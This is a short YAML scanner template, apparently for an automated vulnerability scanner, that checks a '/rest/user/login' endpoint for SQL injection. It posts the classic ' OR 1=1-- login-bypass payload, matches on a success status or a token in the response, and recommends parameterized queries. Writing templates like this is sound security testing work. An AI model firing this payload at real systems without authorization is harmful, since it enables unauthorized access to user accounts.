id: sql-login-bypass
info:
  name: SQL Injection in Login
  severity: critical
  description: Tests for SQL injection in authentication endpoint
  tags:
    - sqli
    - authentication
    - injection

requests:
  - name: "Test SQL injection with OR bypass"
    method: POST
    path: "/rest/user/login"
    headers:
      Content-Type: "application/json"
    body: '{"email": "admin{{rand_int()}}", "password": "\' OR 1=1--"}'
    matchers:
      - type: status
        condition: in
        values: [200, 201]
      - type: word
        words: ["token", "authentication", "user"]
        condition: or
    on_match:
      vulnerability: SQL_INJECTION
      message: "SQL injection allows login bypass"
      remediation: "Use parameterized queries and input validation"
